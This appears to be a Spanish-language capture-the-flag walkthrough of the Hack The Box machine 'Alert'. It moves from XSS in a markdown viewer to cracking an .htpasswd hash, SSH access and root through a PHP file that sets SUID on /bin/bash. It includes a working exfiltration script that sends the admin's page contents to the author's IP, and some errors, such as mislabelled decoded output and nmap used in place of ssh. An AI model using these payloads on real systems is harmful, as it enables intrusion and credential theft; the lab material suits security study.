***

IP máquina -> 10.129.63.24
Mi ip -> 10.10.17.184

Comprobamos que tenemos conexión

```bash
ping -c 1 10.129.63.24
```

### Reconocimiento activo

Ejecutamos nmap a la IP con los siguientes parámetros

```bash
nmap -p- --open -T5 -n -Pn -vvv 10.129.63.24 -oG targeted
```

![[eJPTv2/imgs/Pasted image 20260828122522.png]]

Podemos ver que tenemos el puerto 22 (ssh) y 80 (http) abiertos. Intuimos que hay un servicio web, por lo que aplicamos otro nmap especificamente para ese puerto.

```bash
nmap -p80 -sCV 10.129.63.24 -oN service # Para ver la versión y aplicar script más comunes
```

![[eJPTv2/imgs/Pasted image 20260828122746.png]]

Esta corriendo un servicio apache2 versión 2.4.41, con esto podemos identificar el codename buscando la versión + launchpad -> Resultado: Focal

Al tratarse de una web, podemos aplicar fuzzing y usaremos un script específico de nmap para ello

```bash
nmap --script http-enum -p80 10.129.63.24 -oN targeted
```

No encontramos nada, pero de igual forma podemos usar otra herramienta como gobuster para buscar direcciones:

![[eJPTv2/imgs/gobuster_alert.png|1000]]

Entonces entramos a la página web http://alert.htb

![[eJPTv2/imgs/markdown_viewer.png|1000]]

Usamos la ruta encontrada por gobuster, asi que entramos al directorio messages.php, pero vemos que no tenemos permisos, por lo que asumimos que es de un administrador.

![[eJPTv2/imgs/messages_php.png]]

En la página principal encontramos un visor de archivos markdown con subida de archivos .md, lo cual podría ser vulnerable a un ataque Markdown XSS. Para comprobarlo, escribimos código JS para mandar una alerta a ver si nos la muestra en un archivo markdown para subirlo.

```md
<script>
	alert(0)
</script>
```

Lo subimos a la página y efectivamente podemos ver que es vulnerable a XSS vía subida de archivos markdown.

![[eJPTv2/imgs/alert_htb.png|1000]]

Si le damos a share markdown, podemos ver que nos abre otra pestaña, nos da una cadena cifrada .md

Navegando por las diferentes cabeceras, nos pone un mensaje de que el email que enviemos, irá directamente al administrador, por lo que podemos simular el enlace que proporcionemos funciona al enviarselo al admin.

- Un enlace normal (`[texto](URL)`) → **no** hace GET al cargar; requiere click.
- Si el renderer convierte la URL en un recurso que el navegador carga automáticamente (`img`, `iframe`, etc.) → **sí** hace GET al abrir el mensaje.


![[eJPTv2/imgs/contact_us.png|1000]]

Entonces vemos que esta cargando automáticamente lo que mandemos por mensaje, por lo que nos podemos aprovechar de ello y enviarle el código malicioso en JS (XSS).

Antes hicimos un fuzzing para ver qué directorios estaban descubiertos, por lo que ahora cobra sentido por qué messages.php ponía 403 forbidden, esta es la página que aloja los mensajes de error que recibe el administrador o en nuestro caso, los mensajes con código malicioso.

Para hacer una prueba podemos escribir un archivo markdown en el que se le haga una petición a un servidor que nosotros abrimos con python para que cargue otro archivo .js (el del código malicioso).

```md
# 1. Creamos el archivo alert2.md con el siguiente contenido
<script src="http://10.10.17.184/pwn.js"></script>

# 2. Abrimos un servidor con python en la misma carpeta
python3 -m http.server 80
```

A continuación subimos el archivo a la página, cargamos y le damos a **Share Markdown** obteniendo la siguiente url:

http://alert.htb/visualizer.php?link_share=6a91cc41118481.81247824.md

De tal forma que se lo enviamos en "Contact us" al administrador pegando la url en el mensaje, y podemos ver que en Python tenemos un registro de solicitud GET al archivo del servidor.

![[eJPTv2/imgs/registro_admin.png]] (Claramente pone 404 porque aún no hemos creado dicho archivo)

Entonces el contenido de ese pwn.js es:

```js
var req = new XMLHttpRequest(); # Crea una petición HTTP
req.open('GET', 'http://alert.htb/index.php?page=messages', false) # Específicamos de qué tipo y a dónde la hará, asíncrono
req.send();

var filter = new XMLHttpRequest(); # Crea otra petición
filter.open('GET', 'http://10.10.17.184/?b64' + btoa(req.responseText), false) # Nos autoreenviamos una petición con el HTML en base64 para que lo muestre en los registros
filter.send();
```

Ahora volvemos a cargar el archivo .md, para más detalle, el siguiente flujo:

![[eJPTv2/imgs/flujo_obtener_html.png|1000]]

Decodificamos a texto normal:

```bash 
echo -n "PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9ImNzcy9zdHlsZS5jc3MiPgogICAgPHRpdGxlPkFsZXJ0IC0gTWFya2Rvd24gVmlld2VyPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KICAgIDxuYXY+CiAgICAgICAgPGEgaHJlZj0iaW5kZXgucGhwP3BhZ2U9YWxlcnQiPk1hcmtkb3duIFZpZXdlcjwvYT4KICAgICAgICA8YSBocmVmPSJpbmRleC5waHA/cGFnZT1jb250YWN0Ij5Db250YWN0IFVzPC9hPgogICAgICAgIDxhIGhyZWY9ImluZGV4LnBocD9wYWdlPWFib3V0Ij5BYm91dCBVczwvYT4KICAgICAgICA8YSBocmVmPSJpbmRleC5waHA/cGFnZT1kb25hdGUiPkRvbmF0ZTwvYT4KICAgICAgICAgICAgPC9uYXY+CiAgICA8ZGl2IGNsYXNzPSJjb250YWluZXIiPgogICAgICAgIAogICAgPC9kaXY+CiAgICA8Zm9vdGVyPgogICAgICAgIDxwIHN0eWxlPSJjb2xvcjogYmxhY2s7Ij6pIDIwMjQgQWxlcnQuIEFsbCByaWdodHMgcmVzZXJ2ZWQuPC9wPgogICAgPC9mb290ZXI+CjwvYm9keT4KPC9odG1sPgoK" | base64 -d
```

Y nos devuelve el contenido de /etc/passwd

Dado a que se pueden leer archivos, sabemos que tiene un apache y este guarda un AuthUserFile en ``/var/www/statistics.alert.htb/.htpasswd``, asi que podemos ver el contenido de esa ruta siguiendo el proceso anterior, obteniendo esto:

`albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/`

Es una contraseña hasheada, por lo que podemos usar hashcat para descifrarla a texto plano

```bash
hashcat <archivo_credenciales> /usr/share/wordlists/rockyou.txt --user # Indicamos el archivo donde almacenamos las credenciales y aplicamos un brute-force
```

Como resultado obtenemos la contraseña: ``manchesterunited``

Ahora con ambas credenciales, nos conectamos por shh a la máquina

```bash
ssh albert@10.129.63.24
manchesterunited
```

Y obtenemos acceso al sistema y a la flag del usuario no privilegiado.

Vemos puertos abiertos con  `ss -nltp` y vemos el puerto 8080 abierto, entonces aplicamos localport forwarding para ver el puerto 8080 de la máquina en el de la nuestra:

```bash
nmap albert@10.129.63.24 -L 8080:127.0.0.1:8080
```

Ahora queremos ganar acceso a root y a la flag de este, por lo que empezamos a buscar con `id` a ver a que grupos pertenece y encontramos a `management`, por lo que buscamos archivos pertenecientes a ese grupo

```bash
find / -group management 2>/dev/null
```

Encontramos `website-monitor/monitors` y dentro con un `ls -l` vemos un archivo de configuración perteneciente a root con permiso de escritura, por lo que creamos un archivo test.php

```php
<?php
	system('whoami && id');
?>
```

Como tenemos acceso al puerto 8080 y este representa ``index.php`` dentro de website-monitor, podemos ver el archivo test.php, mostrandonos así el script se ejecuta como root
Vemos los permisos que tiene la bash `/bin/bash` y tenemos que agregarle SUID mediante el script test.php

```php
<?php
	system('chmod u+s /bin/bash');
?>
```

Lanzamos una bash con privilegios y vemos la flag dentro de root

```bash
bash -p

# flag
cat /root/root.txt
```